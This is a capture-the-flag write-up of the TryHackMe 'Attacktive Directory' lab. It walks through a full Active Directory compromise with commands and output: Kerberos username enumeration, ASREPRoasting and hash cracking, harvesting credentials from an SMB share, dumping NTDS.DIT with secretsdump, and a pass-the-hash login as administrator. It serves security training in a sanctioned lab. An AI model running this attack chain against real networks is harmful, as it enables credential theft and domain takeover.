# AttacktiveDirectory

[Play](https://tryhackme.com/room/attacktivedirectory)

Primer:
- [[Video] Active Directory](https://www.youtube.com/watch?v=i9I5poSokow)
- [[Video] [Hindi] Kerberos](https://www.youtube.com/watch?v=dH4hjHLDHV0) - decent overview
- [[Video] Kerberos](https://www.youtube.com/watch?v=_44CHD3Vx-0) - has good visualizations

If this is your first time, as was mine, the above resoruces provide a decent overview of the stuff we are going to deal with. 


## 1. Deploy
Follow the steps!

## 2. Install Tools
Install and follow the steps listed. Add the below too as well. Check their GitHub for more information
- Kerbrute
- evilwinrm

## 3. Enumeration: Basic Scanning
Let's kick off things with our nmap scan. 
```
┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ nmap -sC -sV -A 10.10.230.36     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 23:18 EDT
Nmap scan report for 10.10.230.36
Host is up (0.20s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-21 03:19:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-21T03:19:46+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-05-20T03:01:57
|_Not valid after:  2021-11-19T03:01:57
|_ssl-date: 2021-05-21T03:19:55+00:00; +4s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-21T03:19:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.38 seconds
```

#### What tool will allow us to enumerate port 139/445?
`enum4linux`

> Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.
[Source](https://tools.kali.org/information-gathering/enum4linux#:~:text=Enum4linux%20is%20a%20tool%20for,%2C%20rpclient%2C%20net%20and%20nmblookup.)

NOTE: This tool is mentioned, but never used. 

#### What is the NetBIOS-Domain Name of the machine?
Search in the nmap results.

#### What invalid TLD do people commonly use for their Active Directory Domain?
This is a good questions, very interesting answer is present [here](https://araihan.wordpress.com/2014/05/13/why-you-should-not-use-yourdomain-local-domain/)

> Simply promoting a {xyz.mmm_secure_extension} domain will not secure your domain and you will have a false sense of security that your Active Directory is safe.



## 4. Enumeration: Kerberos
Using the tool [kerbrute](https://github.com/ropnop/kerbrute).

> This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Let's also add the line `10.10.99.177    spookysec.local` (separated by a tab) to the `/etc/hosts/` file. It looks like so:
```
┌──(kali㉿kali)-[~/Desktop/tools]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.99.177    spookysec.local
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Run:
```
┌──(kali㉿kali)-[~/Desktop/tools]
└─$ ./kerbrute userenum --dc spookysec.local -d spookysec.local /tmp/userlist.txt -t 128

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/21/21 - Ronnie Flathers @ropnop

2021/05/21 00:58:04 >  Using KDC(s):
2021/05/21 00:58:04 >   spookysec.local:88

2021/05/21 00:58:04 >  [+] VALID USERNAME:       james@spookysec.local
...
{truncated ;)}
...
2021/05/21 00:59:57 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/05/21 01:00:38 >  Done! Tested 73317 usernames (16 valid) in 154.456 seconds
```

#### What command within Kerbrute will allow us to enumerate valid usernames?
check the `-h` flag if you are new to any tool.

#### What notable account is discovered? (These should jump out at you)
Admin accounts are always interesting. Let's call it `user1` in the rest of the writeup.

#### What is the other notable account is discovered? (These should jump out at you)
Second most delicious account names. Let's call it `item2` in the rest of the writeup.

## 5. Abusing Kerberos
> After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

> Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.


``` 
┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 GetNPUsers.py spookysec.local/{user1} -no-pass             
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for {user1}
${hash type}${user1}@SPOOKYSEC.LOCAL:{salt}${here used to be the hash}
```

```
┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 GetNPUsers.py spookysec.local/{item2} -no-pass 
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for {item2}
[-] User {item2} doesn't have UF_DONT_REQUIRE_PREAUTH set
```

So let's go for {user1}. [Here's the hashcat documentation](https://hashcat.net/wiki/doku.php?id=example_hashes). 

Using hashcat,
```
┌──(kali㉿kali)-[/tmp]
└─$ hashcat -m {find the mode using the link above} hash passwordlist.txt --force 

...
${hash type}${user1}@SPOOKYSEC.LOCAL:{salt}${here used to be the hash}:{password :D :D :D}                
...

```

As voila! We have the password for {user1}! 

NOTE: We get the below error, if the `--force` flag is not there.
```
* Device #1: Skipping hash-mode {the mode used} - known CUDA/OpenCL Runtime/Driver issue (not a hashcat issue)
             You can use --force to override, but do not report related errors.
```


#### We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
`{user1}`


#### Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
Again, look at the documentation!

#### Now crack the hash with the modified password list provided, what is the user accounts password?
{yeee hawwww}

## 6. More Enumeration
Since we now have the credentials for the {user1}, let us go for smb.
```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient -L 10.10.99.177 -U spookysec.local/{user1}
Enter SPOOKYSEC.LOCAL\{user1}'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

None except one really stands out.

```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.99.177/{i wonder which share!} -U spookysec.local/{user1}
Enter SPOOKYSEC.LOCAL\{user1}'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3630842 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

As its too easy!

```
┌──(kali㉿kali)-[/tmp]
└─$ cat backup_credentials.txt 
{looks like a decoded string ... I wonder which method was used to encode}
```

Using [CyberChef](http://icyberchef.com/), `{item2}@spookysec.local:{another password!}`

## 7. Domain Priv-Esc

```
┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 secretsdump.py spookysec.local/{item2}:{yeee hawww}@10.10.99.177                    
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

{there were a lot of hashes here. Removed because they were taking too much space ;) }

[*] Cleaning up... 
```

#### What method allowed us to dump NTDS.DIT?
Check the output of the script we ran. Usually, interesting information is given in a line, starting with `[*]`

#### What is the Administrators NTLM hash?
Same as above. Use the dumps first line and use the structure mentioned in the info line.

#### What method of attack could allow us to authenticate as the user without the password?
`pass the hash`

We can apparently directly send the hash to auth, instead of first cracking it. Quite convenient, aye!

#### Using a tool called Evil-WinRM what option will allow us to use a hash?
When in doubt, always check the `-h` command!


```
┌──(kali㉿kali)-[~/Desktop/tools]
└─$ evil-winrm -i 10.10.99.177 -u administrator {nice flag here} {admin's NLTM hash}

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

And we are in :stonks:

```
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                Administrator
d-----         4/4/2020  12:19 PM                {item2}
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                {user1}
```

GG room, very fun. Lots to learn!
